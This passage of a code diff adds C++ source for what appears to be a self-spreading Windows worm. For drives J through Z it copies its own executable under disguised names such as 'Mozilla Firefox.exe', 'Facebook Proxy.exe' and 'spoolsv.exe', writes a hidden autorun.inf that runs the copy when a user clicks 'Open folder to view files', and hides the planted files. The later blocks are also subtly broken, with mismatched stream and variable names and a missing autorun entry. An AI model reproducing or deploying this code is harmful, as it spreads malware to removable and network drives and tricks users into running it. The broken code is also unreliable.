+    CreateDirectory("J:\\DRMv1PM",NULL);
+    CopyFile(main,"J:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("J:\\DRMv1PM.lic","J:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("J:\\DRMv1PM.lic","J:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"J:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"J:\\Explorer.exe",false);
+    CopyFile(main,"J:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("J:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("J:\\autorun.inf");
+    Filename = "J:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("J:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("J:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("J:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("J:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("J:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("J:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("J:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("K:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("K:\\")){
+case DRIVE_REMOTE:
+    CopyFile(main,"K:\\SystemDirectory.exe",false);
+    break;
+case DRIVE_FIXED:
+    CopyFile(main,"K:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("K:\\RECYCLER\\spools",NULL);
+    CreateDirectory("K:\\DRMv1PM",NULL);
+    CopyFile(main,"K:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("K:\\DRMv1PM.lic","K:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("K:\\DRMv1PM.lic","K:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"K:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"K:\\Explorer.exe",false);
+    CopyFile(main,"K:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("K:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("K:\\autorun.inf");
+    Filename = "K:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("K:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("K:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("K:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("K:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("K:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("K:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("K:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+
+if(CreateDirectory("W:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("W:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"W:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("W:\\RECYCLER\\spools",NULL);
+    CreateDirectory("W:\\DRMv1PM",NULL);
+    CopyFile(main,"W:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("W:\\DRMv1PM.lic","W:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("W:\\DRMv1PM.lic","W:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"W:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"W:\\Explorer.exe",false);
+    CopyFile(main,"W:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("W:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("W:\\autorun.inf");
+    Filename = "W:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("W:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("W:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("W:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("W:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("W:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("W:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("W:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("X:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("X:\\")){
+case DRIVE_REMOTE:
+    CopyFile(main,"X:\\Public Directory.exe",false);
+    CreateDirectory("X:\\Public Files",NULL);
+    CopyFile(main,"X:\\Public Files\\Facebook Proxy.exe",false);
+    break;
+case DRIVE_FIXED:
+    CopyFile(main,"X:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("X:\\RECYCLER\\spools",NULL);
+    CreateDirectory("X:\\DRMv1PM",NULL);
+    CopyFile(main,"X:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("X:\\DRMv1PM.lic","X:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("X:\\DRMv1PM.lic","X:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"X:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"X:\\Explorer.exe",false);
+    CopyFile(main,"X:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("X:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("X:\\autorun.inf");
+    Filename = "X:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    offstream << "[autorun]\n";
+    offstream << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    offstream << "action=Open folder to view files\n";
+    offstream << "icon=%systemroot%\\system32\\shell32.dll,4";
+    offstream.close();
+    SetFileAttributes("X:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("X:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("X:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("X:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("X:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("X:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("X:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+
+}
+}
+if(CreateDirectory("Y:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("Y:\\")){
+case DRIVE_REMOTE:
+    CopyFile(main,"Y:\\Public Directory.exe",false);
+    CreateDirectory("Y:\\Public Files",NULL);
+    CopyFile(main,"Y:\\Public Files\\Facebook Proxy.exe",false);
+    break;
+case DRIVE_FIXED:
+    CopyFile(main,"Y:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("Y:\\RECYCLER\\spools",NULL);
+    CreateDirectory("Y:\\DRMv1PM",NULL);
+    CopyFile(main,"Y:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("Y:\\DRMv1PM.lic","Y:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("Y:\\DRMv1PM.lic","Y:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"Y:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"Y:\\Explorer.exe",false);
+    CopyFile(main,"Y:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("Y:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("Y:\\autorun.inf");
+    Filename = "Y:\\autorun.inf";
+    offstream of(Filename.c_str());
+    offstream << "[autorun]\n";
+    offstream << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    offstream << "action=Open folder to view files\n";
+    offstream << "icon=%systemroot%\\system32\\shell32.dll,4";
+    offstream.close();
+    SetFileAttributes("Y:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Y:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Y:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Y:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Y:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Y:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Y:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+
+}
+}
+if(CreateDirectory("Z:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("Z:\\")){
+case DRIVE_REMOTE:
+    CopyFile(main,"Z:\\Public Directory.exe",false);
+    CreateDirectory("Z:\\Public Files",NULL);
+    CopyFile(main,"Z:\\Public Files\\Facebook Proxy.exe",false);
+    break;
+case DRIVE_FIXED:
+    CopyFile(main,"Z:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("Z:\\RECYCLER\\spools",NULL);
+    CreateDirectory("Z:\\DRMv1PM",NULL);
+    CopyFile(main,"Z:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("Z:\\DRMv1PM.lic","Z:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("Z:\\DRMv1PM.lic","Z:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"Z:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"Z:\\Explorer.exe",false);
+    CopyFile(main,"Z:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("Z:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("Z:\\autorun.inf");
+    filename = "Z:\\autorun.inf";
+    offstream of(Filename.c_str());
+    offstream << "[autorun]\n";
+	offstream << "action=Open folder to view files\n";
+    offstream << "icon=%systemroot%\\system32\\shell32.dll,4";
+    offstream.close();
+    SetFileAttributes("Z:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+
+}
+}
+}
